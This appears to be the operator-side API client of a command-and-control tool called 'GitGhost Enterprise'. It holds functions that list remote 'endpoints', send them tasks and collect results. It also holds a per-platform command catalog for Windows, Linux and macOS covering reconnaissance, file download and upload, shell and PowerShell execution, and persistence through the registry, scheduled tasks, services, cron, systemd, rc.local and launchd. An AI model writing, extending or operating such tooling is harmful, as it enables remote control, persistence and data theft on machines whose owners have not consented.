/**
 * GitGhost Enterprise - API Client
 * Backend communication utilities
 */

import { getServerUrl } from './config';
import { getSession } from './auth';

const getApiBase = () => getServerUrl();

// Get auth headers with session token and access key
const getAuthHeaders = () => {
  const session = getSession();
  const headers = { 'Content-Type': 'application/json' };
  if (session && session.token) {
    headers['X-Session-Token'] = session.token;
  }
  if (session && session.accessKey) {
    headers['X-Access-Key'] = session.accessKey;
  }
  return headers;
};

// Endpoint Management
export const endpointsAPI = {
  getAll: async () => {
    try {
      const response = await fetch(`${getApiBase()}/api/endpoints`, {
        headers: getAuthHeaders()
      });
      if (response.status === 401) return { endpoints: [], unauthorized: true };
      const data = await response.json();
      return { ...data, connected: true };
    } catch (error) {
      console.error('Failed to fetch endpoints:', error);
      return { endpoints: [], connected: false };
    }
  },

  getById: async (id) => {
    try {
      const response = await fetch(`${getApiBase()}/api/endpoints/${id}`, {
        headers: getAuthHeaders()
      });
      if (response.status === 401) return null;
      return await response.json();
    } catch (error) {
      console.error('Failed to fetch endpoint:', error);
      return null;
    }
  }
};

// Task Management
export const tasksAPI = {
  send: async (endpointId, type, args = []) => {
    try {
      const response = await fetch(`${getApiBase()}/api/tasks`, {
        method: 'POST',
        headers: getAuthHeaders(),
        body: JSON.stringify({
          endpoint_id: endpointId,
          type: type,
          args: Array.isArray(args) ? args : [args]
        })
      });
      if (response.status === 401) return { error: 'Unauthorized' };
      return await response.json();
    } catch (error) {
      console.error('Failed to send task:', error);
      return { error: error.message };
    }
  },

  getAll: async () => {
    try {
      const response = await fetch(`${getApiBase()}/api/tasks`, {
        headers: getAuthHeaders()
      });
      if (response.status === 401) return { tasks: [] };
      return await response.json();
    } catch (error) {
      console.error('Failed to fetch tasks:', error);
      return { tasks: [] };
    }
  }
};

// Results Management
export const resultsAPI = {
  getAll: async () => {
    try {
      const response = await fetch(`${getApiBase()}/api/results`, {
        headers: getAuthHeaders()
      });
      if (response.status === 401) return { results: [] };
      return await response.json();
    } catch (error) {
      console.error('Failed to fetch results:', error);
      return { results: [] };
    }
  },

  getById: async (id) => {
    try {
      const response = await fetch(`${getApiBase()}/api/results/${id}`, {
        headers: getAuthHeaders()
      });
      if (response.status === 401) return null;
      return await response.json();
    } catch (error) {
      console.error('Failed to fetch result:', error);
      return null;
    }
  }
};

// Server Status
export const serverAPI = {
  getStatus: async () => {
    try {
      const response = await fetch(`${getApiBase()}/`);
      return await response.json();
    } catch (error) {
      console.error('Failed to fetch server status:', error);
      return null;
    }
  }
};

// Platform-specific requests
export const platformRequests = {
  windows: {
    system: ['sysinfo', 'whoami', 'hostname', 'ipconfig', 'netstat', 'tasklist'],
    files: ['dir', 'cd', 'type', 'download', 'upload'],
    execution: ['shell', 'execute', 'powershell'],
    persistence: ['registry', 'scheduled_task', 'service']
  },
  linux: {
    system: ['sysinfo', 'whoami', 'hostname', 'ifconfig', 'netstat', 'ps'],
    files: ['ls', 'cd', 'cat', 'download', 'upload'],
    execution: ['shell', 'execute', 'bash'],
    persistence: ['cron', 'systemd', 'rc.local']
  },
  macos: {
    system: ['sysinfo', 'whoami', 'hostname', 'ifconfig', 'netstat', 'ps'],
    files: ['ls', 'cd', 'cat', 'download', 'upload'],
    execution: ['shell', 'execute', 'bash', 'osascript'],
    persistence: ['launchd', 'cron']
  }
};

export const getRequestsForPlatform = (platform) => {
  const os = platform?.toLowerCase() || 'windows';
  return platformRequests[os] || platformRequests.windows;
};

export const isRequestValid = (request, platform) => {
  const requests = getRequestsForPlatform(platform);
  const allRequests = Object.values(requests).flat();
  return allRequests.includes(request.split(' ')[0]);
};
